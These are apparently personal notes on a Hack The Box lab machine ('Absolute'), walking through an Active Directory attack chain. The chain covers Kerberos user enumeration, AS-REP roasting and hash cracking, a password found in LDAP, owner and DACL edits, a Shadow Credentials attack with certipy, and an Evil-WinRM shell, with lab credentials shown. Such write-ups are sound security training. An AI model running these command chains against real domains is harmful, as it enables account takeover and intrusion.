* https://0xdf.gitlab.io/2023/05/27/htb-absolute.html

# Auth as d.klay
### Get Username List
```bash
for i in $(seq 1 6); do wget "http://absolute.htb/images/hero_${i}.jpg" ; done

for i in $(seq 1 6); do exiftool hero_${i}.jpg | grep Author | awk '{print $3 " " $4}'; done | tee users
James Roberts
Michael Chaffrey
Donald Klay
Sarah Osvald
Jeffer Robinson
Nicole Smith

~/Tools/username-anarchy/username-anarchy -i users | tee usernames

~/go/bin/kerbrute userenum --dc dc.absolute.htb -d absolute.htb usernames

2023/11/14 16:15:54 >  Using KDC(s):
2023/11/14 16:15:54 >   dc.absolute.htb:88

2023/11/14 16:15:54 >  [+] VALID USERNAME:       j.roberts@absolute.htb
2023/11/14 16:15:55 >  [+] VALID USERNAME:       m.chaffrey@absolute.htb
2023/11/14 16:15:55 >  [+] VALID USERNAME:       s.osvald@absolute.htb
2023/11/14 16:15:55 >  [+] VALID USERNAME:       d.klay@absolute.htb
2023/11/14 16:15:55 >  [+] VALID USERNAME:       j.robinson@absolute.htb
2023/11/14 16:15:56 >  [+] VALID USERNAME:       n.smith@absolute.htb
```

##### Double confirm with crackmapexec

```zsh
crackmapexec smb $IP -u usernames_short -p ''
SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.59   445    DC               [-] absolute.htb\j.roberts: STATUS_ACCOUNT_RESTRICTION 
SMB         10.129.229.59   445    DC               [-] absolute.htb\m.chaffrey: STATUS_ACCOUNT_RESTRICTION 
SMB         10.129.229.59   445    DC               [-] absolute.htb\s.osvald: STATUS_ACCOUNT_RESTRICTION 
SMB         10.129.229.59   445    DC               [-] absolute.htb\d.klay: STATUS_ACCOUNT_RESTRICTION 
SMB         10.129.229.59   445    DC               [-] absolute.htb\j.robinson: STATUS_ACCOUNT_RESTRICTION 
SMB         10.129.229.59   445    DC               [-] absolute.htb\n.smith: STATUS_ACCOUNT_RESTRICTION
```

The purple `[-]` fails with `STATUS_ACCOUNT_RESTRICTION` rather than the others which return `STATUS_LOGON_FAILURE`, suggesting those accounts exist

### AS-Rep-Roast
```bash
impacket-GetNPUsers -dc-ip dc.absolute.htb -usersfile usernames_short absolute.htb/

$krb5asrep$23$d.klay@ABSOLUTE.HTB:0873728c96c41252f7e9640eaf9fb9db$3b8c9a135464acfc7c2ad55acd0d61bddd683bbd5ad899897c6f478fa8c15f47f2f6a08904d098ab397ac2c687e708a5e0ba024493ca213f080abd8e30b1b814cc5ee83b1c5beceec377c3fab777e80401adf167865f5e57a205e76f028b3ff3cac758ea6d10baa2b934503a552ee760b81f1912ae5ce2a3c77ddd2d8acc1e472afb689150a276c81ecefacce806c504907a3c987f302e60a844c3d0e65f619901086ad073aefdbf2fbce88bc78312a1d08c86c573f5c8403319b8a09ce8f226e555f14e59d0fd285ac68ccb6748ed02bf34dcb45e7ffde9fdf598025fbf20fdd859c93eca38a785d34cfdda

hashcat d.klay.hash /usr/share/wordlists/rockyou.txt 

Darkmoonsky248girl
```

### Kerberos Auth
##### Failed without Kerberos
`STATUS_ACCOUNT_RESTRICTION` typically means NTLM is disabled, and need to use Kerberos for auth. That works:

```bash
crackmapexec smb $IP -u d.klay -p 'Darkmoonsky248girl'
SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.59   445    DC               [-] absolute.htb\d.klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
crackmapexec smb $IP -u d.klay -p 'Darkmoonsky248girl' -k
SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.59   445    DC               [-] absolute.htb\d.klay: KRB_AP_ERR_SKEW 
```

##### Method 1, Kinit
It needs to config `/etc/resolv.conf` by adding the Kali's IP as nameserver and `/etc/krb5.conf`.

```conf
[libdefaults]   
    	default_realm = ABSOLUTE.HTB

[realms]
        ABSOLUTE.HTB = {
                kdc = dc.absolute.htb
        }
```

Otherwise, it'll be super slow even it's worked.

```bash
kinit d.klay
Password for d.klay@ABSOLUTE.HTB: 

klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: d.klay@ABSOLUTE.HTB

Valid starting     Expires            Service principal
20/11/23 17:31:35  20/11/23 21:31:35  krbtgt/ABSOLUTE.HTB@ABSOLUTE.HTB
        renew until 20/11/23 21:31:35

sudo ntpdate -u absolute.htb
2023-11-20 17:32:37.857792 (+1300) +25184.900725 +/- 0.109022 absolute.htb 10.129.229.59 s1 no-leap
CLOCK: time stepped by 25184.900725

faketime '2023-11-20 17:36:00' crackmapexec smb $IP -u d.klay -p 'Darkmoonsky248girl' -k
SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.59   445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 
❯ faketime '2023-11-20 17:36:00' crackmapexec smb $IP -u d.klay -p 'Darkmoonsky248girl' -k --shares
SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.59   445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 
SMB         10.129.229.59   445    DC               [+] Enumerated shares
SMB         10.129.229.59   445    DC               Share           Permissions     Remark
SMB         10.129.229.59   445    DC               -----           -----------     ------
SMB         10.129.229.59   445    DC               ADMIN$                          Remote Admin
SMB         10.129.229.59   445    DC               C$                              Default share
SMB         10.129.229.59   445    DC               IPC$            READ            Remote IPC
SMB         10.129.229.59   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.229.59   445    DC               Shared                          
SMB         10.129.229.59   445    DC               SYSVOL          READ            Logon server share 
```

##### Method 2, impacket-getTGT
I'd perfer it since it doesn't need to make configurations. Although, it requires to know the `-dc-ip`

```bash
impacket-getTGT absolute.htb/d.klay:Darkmoonsky248girl -dc-ip dc.absolute.htb
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Saving ticket in d.klay.ccache

rm /tmp/krb5cc_1000
klist
klist: No credentials cache found (filename: /tmp/krb5cc_1000)

export KRB5CCNAME=d.klay.ccache
faketime '2023-11-20 17:50:00' crackmapexec smb $IP -u d.klay -p 'Darkmoonsky248girl' -k --shares
SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.59   445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 
SMB         10.129.229.59   445    DC               [+] Enumerated shares
```

### Bloodbound-python
It requires adding `nameserver Victim's DC_IP 10.129.229.59`

```bash
faketime '2023-11-20 18:49:00' bloodhound-python -u d.klay -p 'Darkmoonsky248girl' -k -d absolute.htb -dc dc.absolute.htb
INFO: Found AD domain: absolute.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc.absolute.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Found 18 users
INFO: Connecting to LDAP server: dc.absolute.htb
INFO: Found 55 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.absolute.htb
INFO: Done in 00M 23S
```

# Auth as svc_smb
### Method 1, ldapsearch
Annonying part:

```bash
faketime '2023-11-20 19:00:00' ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b "cn=users,dc=absolute,dc=htb"
SASL/GSSAPI authentication started
ldap_sasl_interactive_bind: Local error (-2)
        additional info: SASL(-1): generic failure: GSSAPI Error: No credentials were supplied, or the credentials were unavailable or inaccessible (No Kerberos credentials available (default cache: FILE:/tmp/krb5cc_1000))
        ```

To fix this, make sure that `dc.absolute.htb` comes before `absolute.htb` in `/etc/hosts`. That’s because Kerberos is doing a reverse lookup on the IP to get the server name. My OS checks the hosts file, and gets the first host with that IP. Then when it tries to look up that host (absolute.htb) in the Kerberos DB, it doesn’t find one, and returns Server not found in Kerberos database. Props to Ippsec for figuring this out - * https://www.youtube.com/watch?v=rfAmMQV_wss&t=34m45s

```bash
faketime '2023-11-20 19:08:00' ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b "cn=users,dc=absolute,dc=htb"
faketime '2023-11-20 19:08:00' ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b "cn=users,dc=absolute,dc=htb" 'user'
faketime '2023-11-20 19:08:00' ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b "cn=users,dc=absolute,dc=htb" 'user' 'description'

# svc_smb, Users, absolute.htb
dn: CN=svc_smb,CN=Users,DC=absolute,DC=htb
description: AbsoluteSMBService123!
```

##### Method 2, CME
It's better

```bash
faketime '2023-11-20 19:14:00' crackmapexec ldap $IP -u d.klay -p 'Darkmoonsky248girl' -k --users
SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
LDAP        10.129.229.59   389    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 
LDAP        10.129.229.59   389    DC               [*] Total of records returned 20
LDAP        10.129.229.59   389    DC               Administrator                  Built-in account for administering the computer/domain
LDAP        10.129.229.59   389    DC               Guest                          Built-in account for guest access to the computer/domain
LDAP        10.129.229.59   389    DC               krbtgt                         Key Distribution Center Service Account
LDAP        10.129.229.59   389    DC               J.Roberts                      
LDAP        10.129.229.59   389    DC               M.Chaffrey                     
LDAP        10.129.229.59   389    DC               D.Klay                         
LDAP        10.129.229.59   389    DC               s.osvald                       
LDAP        10.129.229.59   389    DC               j.robinson                     
LDAP        10.129.229.59   389    DC               n.smith                        
LDAP        10.129.229.59   389    DC               m.lovegod                      
LDAP        10.129.229.59   389    DC               l.moore                        
LDAP        10.129.229.59   389    DC               c.colt                         
LDAP        10.129.229.59   389    DC               s.johnson                      
LDAP        10.129.229.59   389    DC               d.lemm                         
LDAP        10.129.229.59   389    DC               svc_smb                        AbsoluteSMBService123!
LDAP        10.129.229.59   389    DC               svc_audit                      
LDAP        10.129.229.59   389    DC               winrm_user                     Used to perform simple network tasks

faketime '2023-11-20 19:16:00' crackmapexec smb $IP -u svc_smb -p 'AbsoluteSMBService123!' -k
SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.59   445    DC               [+] absolute.htb\svc_smb:AbsoluteSMBService123!

faketime '2023-11-20 22:28:00' crackmapexec smb $IP -u svc_smb -p 'AbsoluteSMBService123!' -k --shares
SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.59   445    DC               [+] absolute.htb\svc_smb:AbsoluteSMBService123! 
SMB         10.129.229.59   445    DC               [+] Enumerated shares
SMB         10.129.229.59   445    DC               Share           Permissions     Remark
SMB         10.129.229.59   445    DC               -----           -----------     ------
SMB         10.129.229.59   445    DC               ADMIN$                          Remote Admin
SMB         10.129.229.59   445    DC               C$                              Default share
SMB         10.129.229.59   445    DC               IPC$            READ            Remote IPC
SMB         10.129.229.59   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.229.59   445    DC               Shared          READ            
SMB         10.129.229.59   445    DC               SYSVOL          READ            Logon server share
```

# Auth as m.lovegod
### Enum
##### Bloodhound
Mark `svc_smb` owned, Unfortunately, the permissions are the same as d.klay.

##### Method 1, Impacket-Smbclient via TGT instead of kinit
Again, it's better since it doesn't need to config the `/etc/krb5.conf`

```bash
faketime '2023-11-20 20:13:00' impacket-getTGT absolute.htb/svc_smb:AbsoluteSMBService123! -dc-ip dc.absolute.htb
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Saving ticket in svc_smb.ccache
export KRB5CCNAME=svc_smb.ccache

faketime '2023-11-20 20:13:00' impacket-smbclient 'absolute.htb/svc_smb:AbsoluteSMBService123!@dc.absolute.htb' -k
faketime '2023-11-20 19:44:00' impacket-smbclient 'absolute.htb/svc_smb:AbsoluteSMBService123!@dc.absolute.htb' -k -no-pass

# use Shared
# ls
drw-rw-rw-          0  Fri Sep  2 05:02:23 2022 .
drw-rw-rw-          0  Fri Sep  2 05:02:23 2022 ..
-rw-rw-rw-         72  Fri Sep  2 05:02:23 2022 compiler.sh
-rw-rw-rw-      67584  Fri Sep  2 05:02:23 2022 test.exe
# shares
ADMIN$
C$
IPC$
NETLOGON
Shared
SYSVOL

```

##### Method 2, Smbclient
* https://unix.stackexchange.com/questions/722817/the-kerberos-option-is-deprecated-on-smbclient-but-is-the-only-option-working

I tried to make it work but gave up in the end.

```bash
faketime '2023-11-20 20:10:00' smbclient -L //absolute.htb -U 'svc_smb@absolute.htb%AbsoluteSMBService123!' --use-kerberos=required --use-krb5-ccache=svc_smb.ccache
gensec_spnego_client_negTokenInit_step: gse_krb5: creating NEG_TOKEN_INIT for cifs/absolute.htb failed (next[(null)]): NT_STATUS_INVALID_PARAMETER
session setup failed: NT_STATUS_INVALID_PARAMETER
```

### Moving on windows
I didn't do that.
* https://0xdf.gitlab.io/2023/05/27/htb-absolute.html#dynamic-analysis

### CME to Verify it
```bash
faketime '2023-11-21 00:28:00' crackmapexec smb $IP -u m.lovegod -p 'AbsoluteLDAP2022!' -k
SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.59   445    DC               [+] absolute.htb\m.lovegod:AbsoluteLDAP2022!
```

# Auth as winrm_user
### Bloodhound
```bash
faketime '2023-11-21 00:34:00' bloodhound-python -u m.lovegod -p 'AbsoluteLDAP2022!' -d absolute.htb -dc dc.absolute.htb -ns $IP

faketime '2023-11-21 19:42:00' bloodhound-python -u m.lovegod -p 'AbsoluteLDAP2022!' -k -d absolute.htb -dc dc.absolute.htb -ns $IP --zip -c All
```

`bloodhound.py -u m.lovegod -k -d absolute.htb -dc dc.absolute.htb -ns $IP --dns-tcp --zip -c All -no-pass`

`-c All` is important, always using that. `-no-pass` not working for some reasons.

If you encounter DNS issues, you can try using `dnschef` and point the nameserver option on BloodHound to your local machine.

After setup, On the top left, we search for the user `m.lovegod` and right click on the user's node, marking it as owned. We can do the same for the other users.

Looking at the Analysis tab we can see some common predefined queries that we can execute to find interesting and potentially exploitable properties and relations. In this case, however, we find valuable information by looking at the Transitive Object
Control attribute of the `m.lovegod` user node.

* https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab

It seems like the user `m.lovegod` owns the `NETWORK_AUDIT` group, which in turn has `GenericWrite` on `winrm_user`, who is a member of the `REMOTE MANAGEMENT USERS` group. This means that if we manage to work our way to the `winrm_user` user, we can use WinRM and gain access to the machine. One way to do this is to add m.lovegod to the `NETWORK AUDIT` group and then perform a Shadow Credentials Attack on winrm_user . This will work because m.lovegod has the GenericWrite permission over the account, provided that Active Directory Certificate Services ( ADCS ) is installed.

### Shadow Credentials Attack on winrm_user
To get access to winrm_user, I’ll first I’ll need to give m.lovegod write access on the Network Audit group. Then I can add m.lovegod to the group. Finally, I can use those permissions to create a shadow credential for the winrm_user account.

The first two steps are much easier to do on Windows (and Bloodhound tells you the commands to run). I’ll show both Windows and Linux.

The “Shadow Credential” technique involves manipulating the user’s msDS-KeyCredentialLink attribute, which binds a credential to their account that I can then use to authenticate. This technique is much less disruptive than just changing the user’s password. This post from Spector Ops has a ton of good detail.

##### Step 1: Give m.lovegod write access on the Network Audit group
Two ways to explore. I'm gonna go with the official one. Both are essentially same.

* https://github.com/fortra/impacket/pull/1323
* https://0xdf.gitlab.io/2023/05/27/htb-absolute.html#add-mlovegod-to-network-audit

```bash
faketime '2023-11-21 22:34:00' python owneredit.py -k -no-pass absolute.htb/m.lovegod -dc-ip dc.absolute.htb -new-owner m.lovegod -target 'Network Audit' -action write
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Current owner information below
[*] - SID: S-1-5-21-4078382237-1492182817-2568127209-1109
[*] - sAMAccountName: m.lovegod
[*] - distinguishedName: CN=m.lovegod,CN=Users,DC=absolute,DC=htb
[*] OwnerSid modified successfully!
```

##### Step 2: use dacledit.py (another pull request)
Impacket dacledit, which will allow us to give full control of the Network Audit group to the user m.lovegod 

* https://github.com/fortra/impacket/pull/1291

I just copied two files and updated a little instead of get the whole repo.

```python
# from impacket.msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS
from msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS
```

Adding the module search path if it needed when you put them to other directories.

```python
import sys
sys.path.insert(0, '')
```

```bash
faketime '2023-11-21 22:50:00' python dacledit.py -k -no-pass absolute.htb/m.lovegod -dc-ip dc.absolute.htb -principal m.lovegod -target "Network Audit" -action write -rights FullControl
Impacket v0.11.0 - Copyright 2023 Fortra

[*] DACL backed up to dacledit-20231121-202104.bak
[*] DACL modified successfully!
```

##### Step 3: Add user `m.lovegod` to the groups `Network Audit`
This step is so annonying. * https://youtu.be/rfAmMQV_wss?feature=shared&t=3871

You have to keep a great `krb5.conf` And run all these 3 steps very fast, otherwise the cleanup script will remove all of it.

`nameserver 10.129.229.59`

```bash
[libdefaults]
        default_realm = ABSOLUTE.HTB

        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
        fcc-mit-ticketflags = true

[realms]
        ABSOLUTE.HTB = {
                kdc = dc.absolute.htb
                admin_server = dc.absolute.htb
                default_domain = absolute.htb
        }

[domain_realm]
        .absolute.htb = ABSOLUTE.HTB
        absolute.htb = ABSOLUTE.HTB
        ```
```bash
faketime '2023-11-21 22:49:00' net rpc group addmem "Network Audit" m.lovegod -U 'm.lovegod' --use-kerberos=required -S dc.absolute.htb
Password for [WORKGROUP\m.lovegod]:

faketime '2023-11-21 22:35:00' net rpc group members "Network Audit" -U 'm.lovegod' --use-kerberos=required -S dc.absolute.htb
Password for [WORKGROUP\m.lovegod]:
absolute\m.lovegod
absolute\svc_audit

Or ldap to search if the user was added successfully  
ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b "cn=m.lovegod,cn=users,dc=absolute,dc=htb"
```

##### Step 4: shadow cred attack
```bash
faketime '2023-11-21 22:53:00' certipy find -k -no-pass -u absolute.htb/m.lovegod@dc.absolute.htb -dc-ip $IP -target dc.absolute.htb

faketime '2023-11-21 22:55:00' certipy shadow auto -k -no-pass -u absolute.htb/m.lovegod@dc.absolute.htb -dc-ip $IP -target dc.absolute.htb -account winrm_user
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_user'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '7cf7db08-04a1-37f4-c9be-3693bc7ea117'
[*] Adding Key Credential with device ID '7cf7db08-04a1-37f4-c9be-3693bc7ea117' to the Key Credentials for 'winrm_user'
[*] Successfully added Key Credential with device ID '7cf7db08-04a1-37f4-c9be-3693bc7ea117' to the Key Credentials for 'winrm_user'
[*] Authenticating as 'winrm_user' with the certificate
[*] Using principal: winrm_user@absolute.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_user.ccache'
[*] Trying to retrieve NT hash for 'winrm_user'
[*] Restoring the old Key Credentials for 'winrm_user'
[*] Successfully restored the old Key Credentials for 'winrm_user'
[*] NT hash for 'winrm_user': 8738c7413a5da3bc1d083efc0ab06cb2
```

Note: If you encounter problems at this stage, first of all verify that the user `m.lovegod` is still part of the Network Audit group using ldapsearch and after you verify that, ask for a new TGT for the user m.lovegod using the getTGT script.

I indeed encountered the issue, so I ran `kinit m.lovegod` again

```bash
faketime '2023-11-21 23:03:00' evil-winrm -i dc.absolute.htb -u winrm_user -r ABSOLUTE.HTB
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_user\Documents>
```